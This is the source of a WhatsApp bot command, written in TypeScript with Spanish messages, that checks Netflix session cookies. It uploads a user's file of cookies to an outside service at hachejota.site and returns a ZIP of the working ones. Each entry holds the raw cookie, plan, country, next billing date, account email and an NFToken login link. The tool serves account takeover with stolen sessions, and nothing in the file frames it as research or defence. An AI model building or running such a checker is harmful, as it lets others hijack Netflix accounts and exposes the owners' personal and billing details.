import axios from 'axios'
import JSZip from 'jszip'

const API_BASE = 'https://hachejota.site/api'

function getProgressBar(current: number, total: number, length = 10): string {
  const percent = total > 0 ? current / total : 0
  const filled = Math.floor(length * percent)
  return `[${'▓'.repeat(filled)}${'░'.repeat(length - filled)}] ${Math.floor(percent * 100)}%`
}

export default {
  command: ['nfchk', 'chk'],
  description: 'Verifica archivo de cookies Netflix (.txt o .zip)',
  category: 'web',
  run: async (sock: any, m: any, { prefix }: any) => {
    const msg = m.message
    const hasDocument =
      msg?.documentMessage ||
      msg?.documentWithCaptionMessage?.message?.documentMessage

    if (!hasDocument) {
      await sock.sendMessage(m.chat, {
        text: `*Uso:* ${prefix}nfchk\n\nEnvía este comando junto con un archivo *.txt* o *.zip* con cookies de Netflix.\n\n*Formatos soportados:* Netscape, JSON, Raw`,
      }, { quoted: m })
      return
    }

    await sock.sendMessage(m.chat, { react: { text: '📥', key: m.key } })

    let fileBuffer: Buffer
    try {
      const stream = await sock.downloadMediaMessage(m)
      const chunks: Buffer[] = []
      for await (const chunk of stream) chunks.push(chunk)
      fileBuffer = Buffer.concat(chunks)
    } catch {
      await sock.sendMessage(m.chat, { text: '❌ No pude descargar el archivo.' }, { quoted: m })
      return
    }

    const statusMsg = await sock.sendMessage(m.chat, {
      text: '📤 *Subiendo archivo al servidor...*',
    }, { quoted: m })

    try {
      const formData = new FormData()
      const fileName = msg?.documentMessage?.fileName || msg?.documentWithCaptionMessage?.message?.documentMessage?.fileName || 'cookies.txt'

      if (fileName.endsWith('.zip')) {
        formData.append('file', new Blob([fileBuffer]), fileName)
      } else {
        formData.append('file', new Blob([fileBuffer]), fileName)
      }

      const { data } = await axios.post(`${API_BASE}/check-batch`, formData, {
        headers: { 'Content-Type': 'multipart/form-data' },
        timeout: 300000,
        maxContentLength: Infinity,
        maxBodyLength: Infinity,
      })

      if (!data.success) {
        await sock.sendMessage(m.chat, {
          text: `❌ Error: ${data.error || 'Error desconocido'}`,
          edit: statusMsg.key,
        })
        return
      }

      const total = data.total || data.results?.length || 0
      const hits = data.results?.filter((r: any) => r.success)?.length || 0
      const fails = total - hits

      await sock.sendMessage(m.chat, {
        text: `✅ *VERIFICACIÓN COMPLETADA*\n\n├ 📊 Total: \`${total}\`\n├ ✨ Hits: \`${hits}\`\n└ 💀 Fails: \`${fails}\``,
        edit: statusMsg.key,
      })

      if (!hits) {
        await sock.sendMessage(m.chat, { text: '💀 No se encontraron cookies válidas.' }, { quoted: m })
        await sock.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
        return
      }

      // Build ZIP with results
      const zip = new JSZip()
      const validResults = data.results?.filter((r: any) => r.success) || []

      validResults.forEach((r: any, idx: number) => {
        const plan = r.metadata?.plan || 'Unknown'
        const country = r.metadata?.country || 'XX'
        const filename = `[${plan}] [${country}] [${String(idx + 1).padStart(4, '0')}] Netflix.txt`

        let content = `🍪 Netflix Cookie\n`
        content += `-----------------------------------------------------\n`
        content += `${r.rawCookie || ''}\n`
        content += `-----------------------------------------------------\n`
        content += `🧃 Información\n\n`
        if (r.metadata?.country) content += `🌍 País: ${r.metadata.country}\n`
        if (r.metadata?.plan) content += `💎 Plan: ${r.metadata.plan}\n`
        if (r.metadata?.videoQuality) content += `📺 Calidad: ${r.metadata.videoQuality}\n`
        if (r.metadata?.nextBillingDate) content += `📅 Próximo cobro: ${r.metadata.nextBillingDate}\n`
        if (r.metadata?.email) content += `📧 Email: ${r.metadata.email}\n`
        content += `\n-----------------------------------------------------\n`
        if (r.link) content += `🔗 NFToken: ${r.link}\n`
        content += `-----------------------------------------------------\n`

        zip.file(filename, content)
      })

      const zipBuffer = await zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' })
      const timestamp = new Date().toISOString().replace(/[:.]/g, '').slice(0, 15)

      await sock.sendMessage(m.chat, {
        document: zipBuffer,
        fileName: `Netflix_Checked_${timestamp}.zip`,
        mimetype: 'application/zip',
        caption: `📦 *${hits} cuentas válidas*\nFormato: \`[Plan] [PAIS] [XXXX] Netflix.txt\``,
      }, { quoted: m })

      await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
    } catch (err: any) {
      await sock.sendMessage(m.chat, {
        text: `❌ Error: ${err.response?.data?.error || err.message}`,
        edit: statusMsg.key,
      })
    }
  },
}
